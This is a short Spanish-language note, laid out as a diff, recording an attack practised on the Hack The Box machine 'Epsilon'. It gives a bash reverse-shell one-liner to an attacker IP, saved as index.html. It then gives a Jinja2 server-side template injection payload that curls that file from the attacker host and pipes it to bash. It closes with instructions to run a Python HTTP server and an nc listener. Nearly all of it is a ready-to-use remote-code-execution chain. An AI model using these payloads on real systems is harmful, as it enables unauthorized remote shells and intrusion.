@@ -1,0 +1,17 @@
+{Practicado en la maquina Epsilon HTB}
+{Crearemos un RCE desde un html archive}
+
+
+Crearemos index.html con este codigo:
+
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.14.14/443 0>&1
+
+Nos lo interpretara como un archivo bash, solo que este metodo se realiza para un RCE desde una web, ejemplo de un ataque de SSTI
+
+Despues de esto ejecutaremos este comando para la explotacion en caso de SSTI:
+
+{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('curl http://10.10.14.14/index.html | bash').read()}}
+
+Tendremos que tener un puerto en escucha con python en el puerto 80 y otro por el 443 con nc
